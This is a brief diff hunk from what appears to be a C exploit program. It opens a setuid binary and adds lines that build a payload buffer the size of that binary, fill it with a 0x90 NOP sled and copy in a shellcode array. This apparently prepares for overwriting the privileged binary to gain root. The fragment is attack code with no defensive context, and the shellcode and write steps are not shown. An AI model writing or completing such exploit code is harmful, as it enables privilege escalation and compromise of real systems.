@@ -73,6 +73,9 @@ int main(int argc,char *argv[])
 
   f = open(suid_bin,O_RDONLY);
   fstat(f,&st);
+  char payload[st.st_size];
+  memset(payload, 0x90, st.st_size);
+  memcpy(payload, sc, sizeof(sc)+1);
 
 
 
